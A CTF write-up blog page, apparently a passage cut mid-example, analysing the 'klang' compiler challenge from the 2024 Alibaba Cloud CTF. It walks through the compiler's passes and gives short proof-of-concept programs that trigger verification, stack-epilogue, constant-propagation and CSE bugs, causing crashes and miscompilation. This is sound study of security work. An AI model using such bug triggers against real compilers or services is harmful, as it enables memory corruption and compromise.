@@ -1,0 +1,988 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon/icon.jpg">
+  <link rel="icon" href="/img/favicon/icon.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Eurus">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="瞪了一天编译器……然后啥也没瞪出来，非常好大牢，明年还坐">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2024 阿里云CTF klang wp">
+<meta property="og:url" content="http://akaieurus.github.io/2024/03/30/%E9%98%BF%E9%87%8C%E4%BA%91klang/index.html">
+<meta property="og:site_name" content="Eurus禁止摆烂！">
+<meta property="og:description" content="瞪了一天编译器……然后啥也没瞪出来，非常好大牢，明年还坐">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://akaieurus.github.io/img/posts/pc49.jpg">
+<meta property="article:published_time" content="2024-03-30T07:38:44.000Z">
+<meta property="article:modified_time" content="2025-01-03T09:55:16.592Z">
+<meta property="article:author" content="Eurus">
+<meta property="article:tag" content="wp">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://akaieurus.github.io/img/posts/pc49.jpg">
+  
+  
+  
+  <title>2024 阿里云CTF klang wp - Eurus禁止摆烂！</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"akaieurus.github.io","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 100vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Eurus&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/posts/pc49.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="2024 阿里云CTF klang wp"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-03-30 15:38" pubdate>
+          2024年3月30日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.4k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          21 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+        <div class="scroll-down-bar">
+          <i class="iconfont icon-arrowdown"></i>
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">2024 阿里云CTF klang wp</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>瞪了一天编译器……然后啥也没瞪出来，非常好大牢，明年还坐</p>
+<span id="more"></span>
+
+<h1 id="server-py"><a href="#server-py" class="headerlink" title="server.py"></a>server.py</h1><p>流程：</p>
+<ul>
+<li>输入代码</li>
+<li>编译可执行文件</li>
+<li>运行</li>
+</ul>
+<h1 id="runtime"><a href="#runtime" class="headerlink" title="runtime"></a>runtime</h1><p>提供一些接口：</p>
+<ul>
+<li><p>do_printi：输出整数</p>
+</li>
+<li><p>do_prints：输出字符串</p>
+</li>
+<li><p>do_inputi：输入整数</p>
+</li>
+<li><p>do_random：返回一个随机数</p>
+</li>
+<li><p>do_inputs：输入字符串</p>
+</li>
+<li><p>do_array_new：创建一个数组，使用malloc分配内存，结构体：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">array_t</span> &#123;</span><br>    <span class="hljs-type">int64_t</span>* data;<br>    <span class="hljs-type">int64_t</span> size;<br>&#125;;<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>do_array_load：返回arr[index]</p>
+</li>
+<li><p>do_array_store：arr[index]&#x3D;value</p>
+</li>
+</ul>
+<h1 id="compiler"><a href="#compiler" class="headerlink" title="compiler"></a>compiler</h1><p>编译流程：</p>
+<img src="/2024/03/30/%E9%98%BF%E9%87%8C%E4%BA%91klang/compiler.png" srcset="/img/loading.gif" lazyload class title="compiler">
+
+<h2 id="Parse"><a href="#Parse" class="headerlink" title="Parse"></a>Parse</h2><p>词法分析和语法分析是由bison和flex完成的，语法和c语言差不多，一些不一样的见下：</p>
+<ul>
+<li><p>函数：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">function <span class="hljs-title function_">FUNCTIONNAME</span> <span class="hljs-params">(TYPE ARG, TYPE ARG…)</span> : TYPE VAR, TYPE AVR… -&gt; TYPE<br>&#123;<br>    STATEMENTS<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>: 后面是函数中使用的变量</li>
+</ul>
+</li>
+<li><p>赋值语句：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">NAME := VAR;<br></code></pre></td></tr></table></figure></li>
+</ul>
+<p>AST数据结构：</p>
+<img src="/2024/03/30/%E9%98%BF%E9%87%8C%E4%BA%91klang/ast.png" srcset="/img/loading.gif" lazyload class title="ast">
+
+<h2 id="IRGen"><a href="#IRGen" class="headerlink" title="IRGen"></a>IRGen</h2><h3 id="Verify"><a href="#Verify" class="headerlink" title="Verify"></a>Verify</h3><p>验证AST是否合法：</p>
+<ul>
+<li>Module：<ul>
+<li>必须有main函数，无参数，返回类型为int</li>
+<li>函数不重名</li>
+</ul>
+</li>
+<li>Function：<ul>
+<li>至少有一条语句</li>
+<li>最后一条语句必须是return</li>
+<li>var的type不能是void</li>
+<li>最多十个var</li>
+<li>最多三个para</li>
+</ul>
+</li>
+<li>Block：<ul>
+<li>return语句只能出现在block最后</li>
+</ul>
+</li>
+<li>Statement：<ul>
+<li>ASSIGN：左右Expression类型一致</li>
+<li>IF：Condition类型为INT</li>
+<li>IFELSE：Condition类型为INT</li>
+<li>WHILE：<ul>
+<li>Condition类型为INT</li>
+<li>循环block中不能再有WHILE</li>
+</ul>
+</li>
+<li>RETURN：<ul>
+<li>语句Expression类型和所属Function返回类型匹配</li>
+<li>如果没有返回类型则所属Function返回类型必须为void</li>
+</ul>
+</li>
+<li>CALL：Expression合法</li>
+</ul>
+</li>
+<li>Expression：<ul>
+<li>VARIABLE：var必须在所属Function中定义，会返回Function中确定var的类型</li>
+<li>BINARY：左值右值类型相同且为INT</li>
+<li>FUNCTION_CALL：函数参数和函数原型匹配，包括参数数量和类型</li>
+<li>ARRAY_ACCESS：<ul>
+<li>类型和Function中声明匹配</li>
+<li>Index类型为INT</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="BUG"><a href="#BUG" class="headerlink" title="BUG"></a>BUG</h4><p>VerifyExpression处理BINARY时if外面没return</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">  <span class="hljs-keyword">case</span> ASTExpression::EX_BINARY: &#123;<br>    <span class="hljs-keyword">auto</span> *BE = static_cast&lt;ASTExpressionBinary*&gt;(E);<br>    <span class="hljs-keyword">auto</span> LT = VerifyExpression(BE-&gt;GetLHS());<br>    <span class="hljs-keyword">auto</span> RT = VerifyExpression(BE-&gt;GetRHS());<br>    <span class="hljs-keyword">if</span>(LT.has_value() &amp;&amp; RT.has_value()) &#123;<br>      <span class="hljs-keyword">if</span>(LT.value() != RT.value()) &#123;<br><span class="hljs-comment">/* …… */</span><br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">case</span> ASTExpression::EX_FUNCTION_CALL: &#123;<br></code></pre></td></tr></table></figure>
+
+<p>如果LT和RT有一个没有value则会继续进入FUNCTION_CALL的处理，可以通过未声明变量触发</p>
+<p>POC：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">function <span class="hljs-title function_">main</span> <span class="hljs-params">()</span> : <span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b -&gt; <span class="hljs-type">int</span> &#123;<br>	a := c + b;	<span class="hljs-comment">/* c未声明，VerifyExpression无返回值 */</span><br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>但把ASTExpressionBinary当ASTExpressionFunctionCall解析时会crash</p>
+<img src="/2024/03/30/%E9%98%BF%E9%87%8C%E4%BA%91klang/binary.png" srcset="/img/loading.gif" lazyload class title="binary">
+
+<h3 id="Generate"><a href="#Generate" class="headerlink" title="Generate"></a>Generate</h3><p>IR数据结构：</p>
+<img src="/2024/03/30/%E9%98%BF%E9%87%8C%E4%BA%91klang/ir.png" srcset="/img/loading.gif" lazyload class title="ir">
+
+<p>IRGen数据结构：</p>
+<img src="/2024/03/30/%E9%98%BF%E9%87%8C%E4%BA%91klang/irgen.png" srcset="/img/loading.gif" lazyload class title="irgen">
+
+<p>这几个class的用处没那么显然，解释一下：</p>
+<ul>
+<li>FuncBuilder：管理Function<ul>
+<li>管理BasicBlock</li>
+<li>管理Instruction</li>
+</ul>
+</li>
+<li>ModuleGenCtx：管理字面量</li>
+<li>FuncGenCtx：管理虚拟寄存器</li>
+<li>IRGen：创建IR</li>
+</ul>
+<p>注意IRGen的过程中：</p>
+<ul>
+<li>GenerateFunction在Function的Entry开头初始化了所有Var</li>
+<li>同名情况下Var覆盖Para</li>
+<li>IF、IFELSE BasicBlock如果最后一条语句为RETURN则末尾不添加JMP，WHILE没有这条判断</li>
+</ul>
+<h4 id="BUG-1"><a href="#BUG-1" class="headerlink" title="BUG"></a>BUG</h4><ul>
+<li>WHILE的BasicBlock最后加了JMP，CodeGen中EmitEpilogue fix函数退出时是根据BasicBlock最后一条一条指令是否是ret来判断的</li>
+<li>但WHILE的最后一条指令是jmo，所以函数退出的时候没有恢复栈</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">LinearScanRegAlloc::EmitEpilogue</span><span class="hljs-params">()</span> &#123;<br>  <span class="hljs-keyword">for</span>(<span class="hljs-keyword">auto</span> *BB : (*Func_)) &#123;<br>    <span class="hljs-keyword">if</span>(BB-&gt;IsExit()) &#123;<br>      <span class="hljs-keyword">auto</span> *Last = *BB-&gt;rbegin();<br>      BB-&gt;InsertBefore(new MovMachineInst(MachineOperand::CreateRegister(RBP), MachineOperand::CreateRegister(RSP)), Last);<br>      BB-&gt;InsertBefore(new PopMachineInst(MachineOperand::CreateRegister(RBP)), Last);<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>POC：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">function <span class="hljs-title function_">main</span><span class="hljs-params">()</span> : <span class="hljs-type">int</span> a -&gt; <span class="hljs-type">int</span><br>&#123;<br>	a := <span class="hljs-number">10</span>;<br>	<span class="hljs-keyword">do</span>&#123;<br>		prints(<span class="hljs-string">&quot;abaaba&quot;</span>);<br>		a := a - <span class="hljs-number">1</span>;<br>		<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>	&#125;<br>	<span class="hljs-keyword">while</span>(a &gt; <span class="hljs-number">0</span>);<br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>运行结果：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">./test</span>                      <br>abaaba<br>zsh: segmentation fault  ./test<br></code></pre></td></tr></table></figure>
+
+<h2 id="Optimize"><a href="#Optimize" class="headerlink" title="Optimize"></a>Optimize</h2><p>WorkList算法</p>
+<img src="/2024/03/30/%E9%98%BF%E9%87%8C%E4%BA%91klang/worklist.png" srcset="/img/loading.gif" lazyload class title="worklist">
+
+<h3 id="ConstantPropagate"><a href="#ConstantPropagate" class="headerlink" title="ConstantPropagate"></a>ConstantPropagate</h3><p>数据结构：</p>
+<img src="/2024/03/30/%E9%98%BF%E9%87%8C%E4%BA%91klang/const.png" srcset="/img/loading.gif" lazyload class title="const">
+
+<h4 id="BUG-2"><a href="#BUG-2" class="headerlink" title="BUG"></a>BUG</h4><p>ReplaceIn的时候使用的是Out（应该用In）</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">auto</span> &amp;State = Out[BB];	<span class="hljs-comment">// 使用Out</span><br><br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">auto</span> InstIt = BB-&gt;begin(); InstIt != BB-&gt;end(); InstIt++) &#123;<br>  <span class="hljs-keyword">for</span>(<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>; i &lt; InstIt-&gt;Ins(); i++) &#123;<br>    <span class="hljs-keyword">if</span>(InstIt-&gt;GetIn(i).IsRegister()) &#123;<br>      <span class="hljs-type">size_t</span> Reg = InstIt-&gt;GetIn(i).RegId();<br>      <span class="hljs-keyword">if</span>(State.IsConstant(Reg)) &#123;<br>        <span class="hljs-type">int64_t</span> Value = State.GetConstant(Reg);<br>        InstIt-&gt;ReplaceIn(i, Operand::CreateImmediate(Value));	 <span class="hljs-comment">// ReplaceIn</span><br>        Changed = <span class="hljs-literal">true</span>; <br>      &#125;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>这样如果在block结尾给变量赋值一个常量block中所有过程值都会被覆盖</p>
+<p>POC：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">function <span class="hljs-title function_">main</span><span class="hljs-params">()</span> : <span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b -&gt; <span class="hljs-type">int</span> <br>&#123;<br>	prints(<span class="hljs-string">&quot;Please Input a:&quot;</span>);<br>	a := inputi();<br>	b := <span class="hljs-number">1</span> + a;<br>	a := <span class="hljs-number">100</span>;<br>	prints(<span class="hljs-string">&quot;b = a + 1 =&quot;</span>);<br>	printi(b);<br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>优化前后的IR：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c">BEFORE :<br>define main<br>bb1:<br>        %<span class="hljs-number">0</span> = #<span class="hljs-number">0</span><br>        %<span class="hljs-number">1</span> = #<span class="hljs-number">0</span><br>        %<span class="hljs-number">3</span> = load_label __str0<br>        call prints %<span class="hljs-number">3</span><br>        %<span class="hljs-number">4</span> = call inputi<br>        %<span class="hljs-number">0</span> = %<span class="hljs-number">4</span><br>        %<span class="hljs-number">5</span> = #<span class="hljs-number">1</span> + %<span class="hljs-number">0</span><br>        %<span class="hljs-number">1</span> = %<span class="hljs-number">5</span><br>        %<span class="hljs-number">0</span> = #<span class="hljs-number">64</span><br>        %<span class="hljs-number">7</span> = load_label __str1<br>        call prints %<span class="hljs-number">7</span><br>        call printi %<span class="hljs-number">1</span><br>        ret #<span class="hljs-number">0</span><br><br>AFTER :<br>define main<br>bb1:<br>        %<span class="hljs-number">3</span> = load_label __str0<br>        call prints %<span class="hljs-number">3</span><br>        %<span class="hljs-number">4</span> = call inputi<br>        %<span class="hljs-number">7</span> = load_label __str1<br>        call prints %<span class="hljs-number">7</span><br>        call printi #<span class="hljs-number">65</span><br>        ret #<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure>
+
+<p>输出：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">./const</span>            <br>INPUT a:<br>12 <br>OUTPUT b = a + 1:<br>101<br></code></pre></td></tr></table></figure>
+
+<h3 id="CopyPropagate"><a href="#CopyPropagate" class="headerlink" title="CopyPropagate"></a>CopyPropagate</h3><p>数据结构：</p>
+<img src="/2024/03/30/%E9%98%BF%E9%87%8C%E4%BA%91klang/copy.png" srcset="/img/loading.gif" lazyload class title="copy">
+
+<h3 id="CSE"><a href="#CSE" class="headerlink" title="CSE"></a>CSE</h3><p>分LocalCSE和GlobalCSE</p>
+<p>数据结构：</p>
+<img src="/2024/03/30/%E9%98%BF%E9%87%8C%E4%BA%91klang/CSE.png" srcset="/img/loading.gif" lazyload class title="CSE">
+
+<h4 id="LocalCSE"><a href="#LocalCSE" class="headerlink" title="LocalCSE"></a>LocalCSE</h4><p>以BasicBlock为单位处理，处理函数LocalCSEBlock：</p>
+<ul>
+<li><p>第一个循环填充以下局部变量：</p>
+<ul>
+<li>Mapping：map CSEValue -&gt; Ins ID</li>
+<li>Defs：map CSEValue -&gt; Ins</li>
+<li>State：map Ins ID -&gt; set of 现有的CSEValue对应Ins ID</li>
+<li>Reusable：map CSEValue -&gt; vector of CSEValue出现的所有Ins</li>
+</ul>
+</li>
+<li><p>第二个循环遍历所有具有重复CSEValue的Ins，做以下变换：</p>
+<img src="/2024/03/30/%E9%98%BF%E9%87%8C%E4%BA%91klang/replace.png" srcset="/img/loading.gif" lazyload class title="replace">
+</li>
+<li><p>没有处理右值改变的情况，也不用处理，FromInstruction允许右值为Reg</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// RHS should be immutable</span><br><span class="hljs-keyword">if</span>((Op1.IsImmediate() || Op1.IsParameter()) &amp;&amp; (Op2.IsImmediate() || Op2.IsParameter())) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">std</span>::make_optional(CSEValue(BinInst.GetOperation(), Op1, Op2));<br>&#125;<br></code></pre></td></tr></table></figure></li>
+</ul>
+<h4 id="GlobalCSE"><a href="#GlobalCSE" class="headerlink" title="GlobalCSE"></a>GlobalCSE</h4><p>数据结构：</p>
+<img src="/2024/03/30/%E9%98%BF%E9%87%8C%E4%BA%91klang/GCSE.png" srcset="/img/loading.gif" lazyload class title="GCSE">
+
+<p>Available Expressions算法：</p>
+<img src="/2024/03/30/%E9%98%BF%E9%87%8C%E4%BA%91klang/ae.png" srcset="/img/loading.gif" lazyload class title="ae">
+
+<p>指令替换：</p>
+<img src="/2024/03/30/%E9%98%BF%E9%87%8C%E4%BA%91klang/cseee.png" srcset="/img/loading.gif" lazyload class title="cseee">
+
+<p>实际实现：</p>
+<ul>
+<li><p>获取Available Expressions</p>
+</li>
+<li><p>遍历每一个BasicBlock BB</p>
+</li>
+<li><p>遍历BB中的每一条Instruction Ins</p>
+</li>
+<li><p>Ins中存在Available Expressions则：</p>
+<ul>
+<li><p>递归遍历BB所有前驱，替换每一个Available Expressions</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">a</span> = b + <span class="hljs-number">1</span> -&gt; a<span class="hljs-string">&#x27; = b + 1</span><br><span class="hljs-string">			a = a&#x27;</span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>替换Ins</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-keyword">c</span> <span class="hljs-operator">=</span> b + <span class="hljs-number">1</span> -&gt; <span class="hljs-keyword">c</span> <span class="hljs-operator">=</span> a&#x27;<br></code></pre></td></tr></table></figure></li>
+</ul>
+</li>
+</ul>
+<h5 id="BUG-3"><a href="#BUG-3" class="headerlink" title="BUG"></a>BUG</h5><ul>
+<li><p>Meet调用的Intersect中如果GCSEState没有初始化则将Other复制过去</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span>(!Init_) &#123;<br>  Values_ = <span class="hljs-built_in">std</span>::<span class="hljs-built_in">set</span>(Other.Values_.begin(), Other.Values_.end());<br>  Init_ = <span class="hljs-literal">true</span>;<br>  <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>根据算法除了Entry初始化为空其他的BB初始化为全集所以这样也没什么问题（</li>
+<li>但实现没有Entry，就有问题了</li>
+<li>在函数开头把表达式放进do-while里<ul>
+<li>BB的前驱就有了他自己</li>
+<li>没有Entry的空集把BB自己的表达式取交消掉</li>
+<li>这样BB中的表达式会被错误优化掉</li>
+</ul>
+</li>
+</ul>
+<p>POC</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c">function <span class="hljs-title function_">main</span><span class="hljs-params">()</span> : -&gt; <span class="hljs-type">int</span> <br>&#123;<br>	test(<span class="hljs-number">114514</span>, <span class="hljs-number">233333</span>);<br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br>function <span class="hljs-title function_">test</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span> : <span class="hljs-type">int</span> c, <span class="hljs-type">int</span> d -&gt; <span class="hljs-type">int</span><br>&#123;<br>	d := <span class="hljs-number">1</span>;<br>	<span class="hljs-keyword">do</span><br>	&#123;<br>		c := a + b;<br>		prints(<span class="hljs-string">&quot;OUTPUT c = 114514 + 233333:&quot;</span>);<br>		printi(c);<br>		d := d - <span 